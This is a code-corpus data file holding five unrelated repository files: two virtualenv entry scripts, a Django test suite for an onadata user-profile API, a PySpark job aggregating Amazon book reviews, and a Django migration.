{"blob_id": "97f8ee1a055fc743d08f50b1973f79731b51bd57", "directory_id": "fc417164b127160ca59fad53ee9952fdb39efed3", "path": "/venv/bin/pip3.8", "content_id": "ef31143b18cc3bc8cf643599ea77502ff8f81f19", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "yg12344/ubt_alphamini_multilingualtool", "snapshot_id": "bf3e09b7fcba08d9412c2878a80de7ab71192c14", "revision_id": "ebc884a31e5e58ae5296feef4ac061806d4cbf54", "branch_name": "refs/heads/master", "visit_date": "2023-03-20 07:55:37.108324", "revision_date": "2021-01-12 07:29:06", "committer_date": "2021-01-12 07:29:06", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "289", "extension": "8", "content": "#!/home/logic/mnt/logic/workspace/alpha-mini/libs/MultilingualResource/venv/bin/python\n# -*- coding: utf-8 -*-\nimport re\nimport sys\nfrom pip._internal.cli.main import main\nif __name__ == '__main__':\n    sys.argv[0] = re.sub(r'(-script\\.pyw|\\.exe)?$', '', sys.argv[0])\n    sys.exit(main())\n"}
{"blob_id": "d352ed084cf95a49d983d17efdd324f67f7ba009", "directory_id": "235f7fc9b234be72f64f3d26d9ee07be7a0b1967", "path": "/venv/bin/wheel", "content_id": "96cbfb068c7752bec6a084c93658f3920c626ca4", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "ethdevss/latest-version", "snapshot_id": "66cf816076ebc48b9ee9724c3013b92599fbc165", "revision_id": "cd945dd3239478e61b2b6fb0222991accb010c44", "branch_name": "refs/heads/master", "visit_date": "2020-12-01 11:39:12.815075", "revision_date": "2019-12-28 13:53:19", "committer_date": "2019-12-28 13:53:19", "github_id": "230616290", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "244", "extension": "", "content": "#!/home/kei/workspace/sebin-strategy1/venv/bin/python3\n# -*- coding: utf-8 -*-\nimport re\nimport sys\nfrom wheel.cli import main\nif __name__ == '__main__':\n    sys.argv[0] = re.sub(r'(-script\\.pyw|\\.exe)?$', '', sys.argv[0])\n    sys.exit(main())\n"}
{"blob_id": "2aaf42887be24728e579c63352e7a73895e1d076", "directory_id": "706f1183393b2ad09d843027b6626e3c29f0f5c5", "path": "/onadata/apps/api/tests/viewsets/test_user_profile_viewset.py", "content_id": "ed4235172ff6a85ac01a82ec88a6b397dbd08a27", "detected_licenses": "['BSD-2-Clause']", "license_type": "permissive", "repo_name": "AthmanZiri/onadata", "snapshot_id": "6248a864d0484cb8db60333b5ba3ff7edb908771", "revision_id": "d3818296d4e224f1cd329e2c058120124e90f6da", "branch_name": "refs/heads/master", "visit_date": "2021-01-12 04:42:54.152129", "revision_date": "2016-12-20 13:37:36", "committer_date": "2016-12-20 13:37:36", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "28922", "extension": "py", "content": "import json\n\nfrom mock import patch\nfrom django_digest.test import DigestAuth\n\nfrom onadata.apps.api.tests.viewsets.test_abstract_viewset import\\\n    TestAbstractViewSet\nfrom onadata.apps.api.viewsets.user_profile_viewset import UserProfileViewSet\nfrom onadata.apps.main.models import UserProfile\nfrom django.contrib.auth.models import User\nfrom onadata.libs.serializers.user_profile_serializer import (\n    _get_first_last_names\n)\nfrom onadata.apps.api.viewsets.connect_viewset import ConnectViewSet\nfrom onadata.libs.authentication import DigestAuthentication\n\n\ndef _profile_data():\n    return {\n        'username': u'deno',\n        'first_name': u'Dennis',\n        'last_name': u'erama',\n        'email': u'deno@columbia.edu',\n        'city': u'Denoville',\n        'country': u'US',\n        'organization': u'Dono Inc.',\n        'website': u'deno.com',\n        'twitter': u'denoerama',\n        'require_auth': False,\n        'password': 'denodeno',\n        'is_org': False,\n        'name': u'Dennis erama'\n    }\n\n\nclass TestUserProfileViewSet(TestAbstractViewSet):\n\n    def setUp(self):\n        super(self.__class__, self).setUp()\n        self.view = UserProfileViewSet.as_view({\n            'get': 'list',\n            'post': 'create',\n            'patch': 'partial_update',\n            'put': 'update'\n        })\n\n    def test_profiles_list(self):\n        request = self.factory.get('/', **self.extra)\n        response = self.view(request)\n        self.assertNotEqual(response.get('Cache-Control'), None)\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.data, [self.user_profile_data()])\n\n    def test_user_profile_list(self):\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(_profile_data()),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 201)\n\n        data = {\"users\": \"bob,deno\"}\n        request = self.factory.get('/', data=data, **self.extra)\n        response = self.view(request)\n\n        deno_profile_data = _profile_data()\n        deno_profile_data.pop('password', None)\n        user_deno = User.objects.get(username='deno')\n        deno_profile_data.update({\n            'id': user_deno.pk,\n            'url': 'http://testserver/api/v1/profiles/%s' % user_deno.username,\n            'user': 'http://testserver/api/v1/users/%s' % user_deno.username,\n            'gravatar': user_deno.profile.gravatar,\n            'metadata': {},\n            'joined_on': user_deno.date_joined\n        })\n\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual([dict(d) for d in response.data],\n                         [self.user_profile_data(), deno_profile_data])\n        self.assertEqual(len(response.data), 2)\n\n    def test_profiles_get(self):\n        \"\"\"Test get user profile\"\"\"\n        view = UserProfileViewSet.as_view({\n            'get': 'retrieve'\n        })\n        request = self.factory.get('/', **self.extra)\n        response = view(request)\n        self.assertEqual(response.status_code, 400)\n        self.assertEqual(\n            response.data, {'detail': 'Expected URL keyword argument `user`.'})\n\n        # by username\n        response = view(request, user='bob')\n        self.assertNotEqual(response.get('Cache-Control'), None)\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.data, self.user_profile_data())\n\n        # by username mixed case\n        response = view(request, user='BoB')\n        self.assertEqual(response.status_code, 200)\n        self.assertNotEqual(response.get('Cache-Control'), None)\n        self.assertEqual(response.data, self.user_profile_data())\n\n        # by pk\n        response = view(request, user=self.user.pk)\n        self.assertNotEqual(response.get('Cache-Control'), None)\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.data, self.user_profile_data())\n\n    def test_profiles_get_anon(self):\n        view = UserProfileViewSet.as_view({\n            'get': 'retrieve'\n        })\n        request = self.factory.get('/')\n        response = view(request)\n        self.assertEqual(response.status_code, 400)\n        self.assertEqual(\n            response.data, {'detail': 'Expected URL keyword argument `user`.'})\n        request = self.factory.get('/')\n        response = view(request, user='bob')\n        data = self.user_profile_data()\n        del data['email']\n\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.data, data)\n        self.assertNotIn('email', response.data)\n\n    def test_profiles_get_org_anon(self):\n        self._org_create()\n        self.client.logout()\n        view = UserProfileViewSet.as_view({\n            'get': 'retrieve'\n        })\n        request = self.factory.get('/')\n        response = view(request, user=self.company_data['org'])\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.data['first_name'],\n                         self.company_data['name'])\n        self.assertIn('is_org', response.data)\n        self.assertEqual(response.data['is_org'], True)\n\n    def test_profile_create(self):\n        request = self.factory.get('/', **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 200)\n        data = _profile_data()\n        del data['name']\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 201)\n        password = data['password']\n        del data['password']\n        profile = UserProfile.objects.get(user__username=data['username'])\n        data['id'] = profile.user.pk\n        data['gravatar'] = profile.gravatar\n        data['url'] = 'http://testserver/api/v1/profiles/deno'\n        data['user'] = 'http://testserver/api/v1/users/deno'\n        data['metadata'] = {}\n        data['joined_on'] = profile.user.date_joined\n        data['name'] = \"%s %s\" % ('Dennis', 'erama')\n        self.assertEqual(response.data, data)\n\n        user = User.objects.get(username='deno')\n        self.assertTrue(user.is_active)\n        self.assertTrue(user.check_password(password), password)\n\n    def test_profile_create_without_last_name(self):\n        data = {\n            'username': u'deno',\n            'first_name': u'Dennis',\n            'email': u'deno@columbia.edu',\n        }\n\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 201)\n\n    def test_profile_create_with_malfunctioned_email(self):\n        request = self.factory.get('/', **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 200)\n        data = {\n            'username': u'nguyenquynh',\n            'first_name': u'Nguy\\u1ec5n Th\\u1ecb',\n            'last_name': u'Di\\u1ec5m Qu\\u1ef3nh',\n            'email': u'onademo0+nguyenquynh@gmail.com\\ufeff',\n            'city': u'Denoville',\n            'country': u'US',\n            'organization': u'Dono Inc.',\n            'website': u'nguyenquynh.com',\n            'twitter': u'nguyenquynh',\n            'require_auth': False,\n            'password': u'onademo',\n            'is_org': False,\n        }\n\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 201)\n        password = data['password']\n        del data['password']\n\n        profile = UserProfile.objects.get(user__username=data['username'])\n        data['id'] = profile.user.pk\n        data['gravatar'] = profile.gravatar\n        data['url'] = 'http://testserver/api/v1/profiles/nguyenquynh'\n        data['user'] = 'http://testserver/api/v1/users/nguyenquynh'\n        data['metadata'] = {}\n        data['joined_on'] = profile.user.date_joined\n        data['name'] = \"%s %s\" % (\n            u'Nguy\\u1ec5n Th\\u1ecb', u'Di\\u1ec5m Qu\\u1ef3nh')\n        self.assertEqual(response.data, data)\n\n        user = User.objects.get(username='nguyenquynh')\n        self.assertTrue(user.is_active)\n        self.assertTrue(user.check_password(password), password)\n\n    def test_profile_create_with_invalid_username(self):\n        request = self.factory.get('/', **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 200)\n        data = _profile_data()\n        data['username'] = u'de'\n        del data['name']\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 400)\n        self.assertEqual(\n            response.data.get('username'),\n            [u'Ensure this field has at least 3 characters.'])\n\n    def test_profile_create_anon(self):\n        data = _profile_data()\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\")\n        response = self.view(request)\n        self.assertEqual(response.status_code, 201)\n        del data['password']\n        del data['email']\n        profile = UserProfile.objects.get(user__username=data['username'])\n        data['id'] = profile.user.pk\n        data['gravatar'] = profile.gravatar\n        data['url'] = 'http://testserver/api/v1/profiles/deno'\n        data['user'] = 'http://testserver/api/v1/users/deno'\n        data['metadata'] = {}\n        data['joined_on'] = profile.user.date_joined\n        self.assertEqual(response.data, data)\n        self.assertNotIn('email', response.data)\n\n    def test_profile_create_missing_name_field(self):\n        request = self.factory.get('/', **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 200)\n        data = _profile_data()\n        del data['first_name']\n        del data['name']\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        response.render()\n        self.assertContains(response,\n                            'Either name or first_name should be provided',\n                            status_code=400)\n\n    def test_split_long_name_to_first_name_and_last_name(self):\n        name = \"(CPLTGL) Centre Pour la Promotion de la Liberte D'Expression \"\\\n            \"et de la Tolerance Dans La Region de\"\n        first_name, last_name = _get_first_last_names(name)\n        self.assertEqual(first_name, \"(CPLTGL) Centre Pour la Promot\")\n        self.assertEqual(last_name, \"ion de la Liberte D'Expression\")\n\n    def test_partial_updates(self):\n        self.assertEqual(self.user.profile.country, u'US')\n        country = u'KE'\n        username = 'george'\n        metadata = {u'computer': u'mac'}\n        json_metadata = json.dumps(metadata)\n        data = {'username': username,\n                'country': country,\n                'metadata': json_metadata}\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        profile = UserProfile.objects.get(user=self.user)\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(profile.country, country)\n        self.assertEqual(profile.metadata, metadata)\n        self.assertEqual(profile.user.username, username)\n\n    def test_partial_updates_empty_metadata(self):\n        profile = UserProfile.objects.get(user=self.user)\n        profile.metadata = dict()\n        profile.save()\n        metadata = {u\"zebra\": {u\"key1\": \"value1\", u\"key2\": \"value2\"}}\n        json_metadata = json.dumps(metadata)\n        data = {\n            'metadata': json_metadata,\n            'overwrite': 'false'\n        }\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        profile = UserProfile.objects.get(user=self.user)\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(profile.metadata, metadata)\n\n    def test_partial_updates_too_long(self):\n        # the max field length for username is 30 in django\n        username = 'a' * 31\n        data = {'username': username}\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        profile = UserProfile.objects.get(user=self.user)\n        self.assertEqual(response.status_code, 400)\n        self.assertEqual(\n            response.data,\n            {'username':\n             [u'Ensure this field has no more than 30 characters.']})\n        self.assertNotEqual(profile.user.username, username)\n\n    def test_partial_update_metadata_field(self):\n        metadata = {u\"zebra\": {u\"key1\": \"value1\", u\"key2\": \"value2\"}}\n        json_metadata = json.dumps(metadata)\n        data = {\n            'metadata': json_metadata,\n        }\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        profile = UserProfile.objects.get(user=self.user)\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(profile.metadata, metadata)\n\n        # create a new key/value object if it doesn't exist\n        data = {\n            'metadata': '{\"zebra\": {\"key3\": \"value3\"}}',\n            'overwrite': u'false'\n        }\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        profile = UserProfile.objects.get(user=self.user)\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(\n            profile.metadata, {u\"zebra\": {\n                u\"key1\": \"value1\", u\"key2\": \"value2\", u\"key3\": \"value3\"}})\n\n        # update an existing key/value object\n        data = {\n            'metadata': '{\"zebra\": {\"key2\": \"second\"}}', 'overwrite': u'false'}\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        profile = UserProfile.objects.get(user=self.user)\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(\n            profile.metadata, {u\"zebra\": {\n                u\"key1\": \"value1\", u\"key2\": \"second\", u\"key3\": \"value3\"}})\n\n        # add a new key/value object if the key doesn't exist\n        data = {\n            'metadata': '{\"animal\": \"donkey\"}', 'overwrite': u'false'}\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        profile = UserProfile.objects.get(user=self.user)\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(\n            profile.metadata, {\n                u\"zebra\": {\n                    u\"key1\": \"value1\", u\"key2\": \"second\", u\"key3\": \"value3\"},\n                u'animal': u'donkey'})\n\n        # don't pass overwrite param\n        data = {'metadata': '{\"b\": \"caah\"}'}\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        profile = UserProfile.objects.get(user=self.user)\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(\n            profile.metadata, {u'b': u'caah'})\n\n        # pass 'overwrite' param whose value isn't false\n        data = {'metadata': '{\"b\": \"caah\"}', 'overwrite': u'falsey'}\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        profile = UserProfile.objects.get(user=self.user)\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(\n            profile.metadata, {u'b': u'caah'})\n\n    def test_put_update(self):\n\n        data = _profile_data()\n        # create profile\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 201)\n\n        # edit username with existing different user's username\n        data['username'] = 'bob'\n        request = self.factory.put(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request, user='deno')\n        self.assertEqual(response.status_code, 400)\n\n        # update\n        data['username'] = 'roger'\n        data['city'] = 'Nairobi'\n        request = self.factory.put(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request, user='deno')\n\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.data['city'], data['city'])\n\n    def test_profile_create_mixed_case(self):\n        request = self.factory.get('/', **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 200)\n        data = _profile_data()\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 201)\n        del data['password']\n        profile = UserProfile.objects.get(\n            user__username=data['username'].lower())\n        data['id'] = profile.user.pk\n        data['gravatar'] = unicode(profile.gravatar)\n        data['url'] = 'http://testserver/api/v1/profiles/deno'\n        data['user'] = 'http://testserver/api/v1/users/deno'\n        data['username'] = u'deno'\n        data['metadata'] = {}\n        data['joined_on'] = profile.user.date_joined\n        self.assertEqual(response.data, data)\n\n        data['username'] = u'deno'\n        data['joined_on'] = str(profile.user.date_joined)\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 400)\n        self.assertIn(\"%s already exists\" %\n                      data['username'], response.data['username'])\n\n    def test_change_password(self):\n        view = UserProfileViewSet.as_view(\n            {'post': 'change_password'})\n        current_password = \"bobbob\"\n        new_password = \"bobbob1\"\n        post_data = {'current_password': current_password,\n                     'new_password': new_password}\n\n        request = self.factory.post('/', data=post_data, **self.extra)\n        response = view(request, user='bob')\n        user = User.objects.get(username__iexact=self.user.username)\n        self.assertEqual(response.status_code, 200)\n        self.assertTrue(user.check_password(new_password))\n\n    def test_change_password_wrong_current_password(self):\n        view = UserProfileViewSet.as_view(\n            {'post': 'change_password'})\n        current_password = \"wrong_pass\"\n        new_password = \"bobbob1\"\n        post_data = {'current_password': current_password,\n                     'new_password': new_password}\n\n        request = self.factory.post('/', data=post_data, **self.extra)\n        response = view(request, user='bob')\n        user = User.objects.get(username__iexact=self.user.username)\n        self.assertEqual(response.status_code, 400)\n        self.assertFalse(user.check_password(new_password))\n\n    def test_profile_create_with_name(self):\n        data = {\n            'username': u'deno',\n            'name': u'Dennis deno',\n            'email': u'deno@columbia.edu',\n            'city': u'Denoville',\n            'country': u'US',\n            'organization': u'Dono Inc.',\n            'website': u'deno.com',\n            'twitter': u'denoerama',\n            'require_auth': False,\n            'password': 'denodeno',\n            'is_org': False,\n        }\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n\n        self.assertEqual(response.status_code, 201)\n        del data['password']\n        profile = UserProfile.objects.get(user__username=data['username'])\n        data['id'] = profile.user.pk\n        data['first_name'] = 'Dennis'\n        data['last_name'] = 'deno'\n        data['gravatar'] = profile.gravatar\n        data['url'] = 'http://testserver/api/v1/profiles/deno'\n        data['user'] = 'http://testserver/api/v1/users/deno'\n        data['metadata'] = {}\n        data['joined_on'] = profile.user.date_joined\n\n        self.assertEqual(response.data, data)\n\n        user = User.objects.get(username='deno')\n        self.assertTrue(user.is_active)\n\n    def test_twitter_username_validation(self):\n        data = {\n            'username': u'deno',\n            'name': u'Dennis deno',\n            'email': u'deno@columbia.edu',\n            'city': u'Denoville',\n            'country': u'US',\n            'organization': u'Dono Inc.',\n            'website': u'deno.com',\n            'twitter': u'denoerama',\n            'require_auth': False,\n            'password': 'denodeno',\n            'is_org': False,\n        }\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n\n        self.assertEqual(response.status_code, 201)\n        data['twitter'] = 'denoerama'\n        data = {\n            'username': u'deno',\n            'name': u'Dennis deno',\n            'email': u'deno@columbia.edu',\n            'city': u'Denoville',\n            'country': u'US',\n            'organization': u'Dono Inc.',\n            'website': u'deno.com',\n            'twitter': u'denoeramaddfsdsl8729320392ujijdswkp--22kwklskdsjs',\n            'require_auth': False,\n            'password': 'denodeno',\n            'is_org': False,\n        }\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n\n        self.assertEqual(response.status_code, 400)\n        self.assertEqual(\n            response.data['twitter'],\n            [u'Invalid twitter username {}'.format(data['twitter'])]\n        )\n\n        user = User.objects.get(username='deno')\n        self.assertTrue(user.is_active)\n\n    def test_put_patch_method_on_names(self):\n        data = _profile_data()\n        # create profile\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 201)\n\n        # update\n        data['first_name'] = 'Tom'\n        del data['name']\n        request = self.factory.put(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n\n        response = self.view(request, user='deno')\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.data['first_name'], data['first_name'])\n\n        first_name = u'Henry'\n        last_name = u'Thierry'\n\n        data = {'first_name': first_name, 'last_name': last_name}\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        self.assertEqual(response.status_code, 200)\n\n        self.assertEqual(response.data['first_name'], data['first_name'])\n        self.assertEqual(response.data['last_name'], data['last_name'])\n\n    @patch('django.core.mail.EmailMultiAlternatives.send')\n    def test_send_email_activation_api(self, mock_send_mail):\n        request = self.factory.get('/', **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 200)\n        data = _profile_data()\n        del data['name']\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 201)\n        # Activation email not sent\n        self.assertFalse(mock_send_mail.called)\n        user = User.objects.get(username='deno')\n        self.assertTrue(user.is_active)\n\n    def test_partial_update_without_password_fails(self):\n        data = {'email': 'user@example.com'}\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        self.assertEqual(response.status_code, 400)\n        self.assertEqual(\n            [u'Your password is required when updating your email address.'],\n            response.data)\n\n    def test_partial_update_with_invalid_email_fails(self):\n        data = {'email': 'user@example'}\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        self.assertEqual(response.status_code, 400)\n\n    def test_partial_update_email(self):\n        data = {'email': 'user@example.com',\n                'password': \"invalid_password\"}\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        self.assertEqual(response.status_code, 400)\n\n        data = {'email': 'user@example.com',\n                'password': 'bobbob'}\n        request = self.factory.patch('/', data=data, **self.extra)\n        response = self.view(request, user=self.user.username)\n        profile = UserProfile.objects.get(user=self.user)\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(profile.user.email, 'user@example.com')\n\n    def test_update_first_last_name_password_not_affected(self):\n        data = {'first_name': 'update_first',\n                'last_name': 'update_last'}\n        request = self.factory.patch(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request, user=self.user.username)\n\n        self.assertEqual(response.status_code, 200)\n\n        view = ConnectViewSet.as_view(\n            {'get': 'list'},\n            authentication_classes=(DigestAuthentication,))\n\n        auth = DigestAuth('bob@columbia.edu', 'bobbob')\n        request = self._get_request_session_with_auth(view, auth)\n\n        response = view(request)\n        self.assertEqual(response.status_code, 200)\n\n    def test_partial_update_unique_email_api(self):\n        data = {'email': 'example@gmail.com',\n                'password': 'bobbob'}\n        request = self.factory.patch(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request, user=self.user.username)\n\n        self.assertEqual(response.status_code, 200)\n\n        self.assertEqual(response.data['email'], data['email'])\n        # create User\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(_profile_data()),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.status_code, 201)\n        user = User.objects.get(username='deno')\n        # Update email\n        request = self.factory.patch(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request, user=user.username)\n\n        self.assertEqual(response.status_code, 400)\n\n    def test_profile_create_fails_with_long_first_and_last_names(self):\n        data = {\n            'username': u'machicimo',\n            'email': u'mike@columbia.edu',\n            'city': u'Denoville',\n            'country': u'US',\n            'last_name':\n                u'undeomnisistenatuserrorsitvoluptatem',\n            'first_name':\n                u'quirationevoluptatemsequinesciunt'\n        }\n        request = self.factory.post(\n            '/api/v1/profiles', data=json.dumps(data),\n            content_type=\"application/json\", **self.extra)\n        response = self.view(request)\n        self.assertEqual(response.data['first_name'][0],\n                         u'Ensure this field has no more than 30 characters.')\n        self.assertEqual(response.data['last_name'][0],\n                         u'Ensure this field has no more than 30 characters.')\n        self.assertEqual(response.status_code, 400)\n"}
{"blob_id": "2fa9e7beddaa1ec70f69d4b3934baf9bf6630303", "directory_id": "88670560ea5d0a753fda3469c2449845c424b4dd", "path": "/spark_job.py", "content_id": "30dd1e08bcd6e9cae7fa70f27c90eb0ddbfca418", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "advanced-disruptor/poc", "snapshot_id": "0abdfc216ab8da4c65e01f5edfb5893776ef6e32", "revision_id": "0a8145c01d62616bb052e18620222b542038e85f", "branch_name": "refs/heads/main", "visit_date": "2022-12-29 05:38:23.928115", "revision_date": "2020-10-13 13:41:21", "committer_date": "2020-10-13 13:41:21", "github_id": "303711143", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1145", "extension": "py", "content": "# pyspark_job.py\n\nfrom pyspark.sql import SparkSession\nfrom pyspark.sql import functions as F\n\ndef create_spark_session():\n    return SparkSession.builder.config(\n\t\"spark.jars.packages\",\n        \"org.apache.hadoop:hadoop-aws:2.7.0\"\n    ).getOrCreate()\n\ndef process_book_data(spark, input_path, output_path):\n    df = spark.read.parquet(input_path)\n    book_agg = df.filter(df.verified_purchase == 'Y') \\\n        .groupBy('product_title') \\\n        .agg({'star_rating': 'avg', 'review_id': 'count'}) \\\n        .filter(F.col('count(review_id)') >= 500) \\\n        .sort(F.desc('avg(star_rating)')) \\\n        .select(F.col('product_title').alias('book_title'),\n                F.col('count(review_id)').alias('review_count'),\n                F.col('avg(star_rating)').alias('review_avg_stars'))\n    book_agg.write.mode('overwrite').save(output_path)\n\ndef main():\n    spark = create_spark_session()\n    input_path = ('s3://amazon-reviews-pds/parquet/' +\n                  'product_category=Books/*.parquet')\n    output_path = 's3://pyspark-aws-emr/result'\n    process_book_data(spark, input_path, output_path)\n\nif __name__ == '__main__':\n    main()\n\n"}
{"blob_id": "e7ef237a242c1df8dd3125dd680dfc3a251e39e4", "directory_id": "3fda3ff2e9334433554b6cf923506f428d9e9366", "path": "/hipeac/migrations/0018_auto_20190131_1245.py", "content_id": "05e389d20c7a24fa3c385a730a8607cce3faedd6", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "CreativeOthman/hipeac", "snapshot_id": "12adb61099886a6719dfccfa5ce26fdec8951bf9", "revision_id": "2ce98da17cac2c6a87ec88df1b7676db4c200607", "branch_name": "refs/heads/master", "visit_date": "2022-07-20 10:06:58.771811", "revision_date": "2020-05-07 11:39:13", "committer_date": "2020-05-07 11:44:51", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "464", "extension": "py", "content": "# Generated by Django 2.1.5 on 2019-01-31 11:45\n\nfrom django.db import migrations, models\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        (\"hipeac\", \"0017_membershiprequest\"),\n    ]\n\n    operations = [\n        migrations.RemoveField(model_name=\"membershiprequest\", name=\"status\",),\n        migrations.AddField(\n            model_name=\"membershiprequest\", name=\"accepted\", field=models.BooleanField(default=None, null=True),\n        ),\n    ]\n"}
